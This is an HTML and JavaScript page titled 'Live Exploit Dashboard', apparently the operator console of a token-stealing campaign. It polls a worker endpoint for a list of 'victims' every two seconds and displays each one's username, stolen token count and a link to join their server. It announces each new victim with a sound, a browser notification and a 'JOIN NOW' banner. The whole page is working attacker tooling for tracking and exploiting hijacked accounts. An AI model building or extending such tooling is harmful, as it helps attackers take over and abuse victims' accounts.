<!DOCTYPE html>
<html>
<head>
    <title>Live Exploit Dashboard</title>
    <style> /* Same CSS as before */ </style>
</head>
<body>
    <h1>🔴 LIVE VICTIM MONITOR</h1>
    <div id="notification"></div>
    <div id="victims"></div>

    <script>
        const API_URL = 'https://your-worker.youraccount.workers.dev';
        let sound = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAo'); // Beep sound
        
        // WEB PUSH NOTIFICATION
        if (Notification.permission === 'default') {
            Notification.requestPermission();
        }
        
        // POLL EVERY 2 SECONDS
        setInterval(fetchVictims, 2000);
        
        async function fetchVictims() {
            const res = await fetch(API_URL + '/victims');
            const victims = await res.json();
            
            if (victims.length > document.querySelectorAll('.victim').length) {
                // NEW VICTIM!
                showNotification('🟢 NEW VICTIM: ' + victims[0].username);
                sound.play();
                document.getElementById('notification').innerHTML = 
                    `<div style="background:red;color:white;padding:10px;">🎉 NEW VICTIM! ${victims[0].tokens} TOKENS - JOIN NOW!</div>`;
            }
            
            renderVictims(victims);
        }
        
        function showNotification(title) {
            if (Notification.permission === 'granted') {
                new Notification(title);
            }
        }
        
        function renderVictims(victims) {
            document.getElementById('victims').innerHTML = 
                victims.map(v => `
                    <div class="victim">
                        <h3>${v.username} - ${v.tokens} TOKENS</h3>
                        <a href="${v.serverLink}" target="_blank" class="server-btn">🚀 JOIN SERVER</a>
                    </div>
                `).join('');
        }
    </script>
</body>
</html>
